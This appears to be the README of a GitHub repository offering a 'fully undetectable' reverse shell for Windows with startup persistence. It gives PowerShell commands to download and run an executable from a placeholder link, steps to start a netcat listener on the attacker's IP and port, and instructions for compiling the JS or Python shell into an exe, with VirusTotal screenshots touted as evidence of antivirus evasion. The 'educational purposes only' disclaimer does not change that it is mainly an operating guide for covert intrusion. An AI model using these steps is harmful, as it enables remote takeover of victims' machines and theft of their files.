## Setup:
<img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://raw.githubusercontent.com/Ayhuuu/Fud-Reverse-Shell/main/img/ss1.png"></img>

```
» sample commands

» if you want to know username and file location name type pwd


» Extract from Zip: Expand-Archive -Path C:\Users\{Username}\Downloads\file.zip -DestinationPath C:\Users\{Username}\Downloads\file


» creates new folder: New-Item -ItemType Directory -Path "C:\Users\{Username}\Downloads\New Folder"


» app deletes: Remove-Item "C:\Users\{Username}\Downloads\shell.exe"


» The program downloads: powershell -c "(New-Object System.Net.WebClient).DownloadFile('https://YourDownloadLink/program.exe', 'C:\Users\{Username}\Downloads\Program.exe')"


» Reads inside a file: type File.txt


» Runs the program: powershell -c "Start-Process C:\Users\{Username}\Downloads\downloaded_file.exe"


» Copies the file from one place to another: scp C:\Users\Administrator\Downloads\program.exe C:\Users\Administrator\Desktop\program.exe
```
» Reverse shell + Windows Startup

» Change the 127.0.0.1 ip address in the codes according to yourself

» Change the 4444 port in the codes according to your own

» if you are using windows you need to download netcat first
[install netcat](https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip) 

» After downloading open cmd as administrator

» After opening cmd, go to the file location where netcat is located from cmd and type this:

nc64.exe -nvlp `Your Port`

» if you want to js to exe first Install [Node.js](https://nodejs.org/en/download/) 

» to make exe from js 

`npm install pkg`

`pkg shell.js`


» js to exe virustotal result

<img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="55%" src="https://raw.githubusercontent.com/Ayhuuu/Fud-Reverse-Shell/main/img/js.png"></img>

» runs install_python.bat if python is installed

» if you want to py to exe

» open cmd and type 

`pip insall pyinstaller`

`pyinstaller --onefile --windowed shell.py`

» py to exe virustotal result 

<img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="55%" src="https://raw.githubusercontent.com/Ayhuuu/Fud-Reverse-Shell/main/img/python.png"></img>

» vbs does not need an installation, just double click

» vbs virustotal result 

<img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="55%" src="https://raw.githubusercontent.com/Ayhuuu/Fud-Reverse-Shell/main/img/vbs.png"></img>
## Disclaimer:

This tool is for educational purposes only. It is coded for you to see how your files are simply stolen and how to take action. Do not use for illegal purposes. We are never responsible for illegal use. <bold>Educational purpose only!</bold>

## License:
By downloading this, you agree to the Commons Clause license and that you're not allowed to sell this repository or any code from this repository. For more info see https://commonsclause.com/.

<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
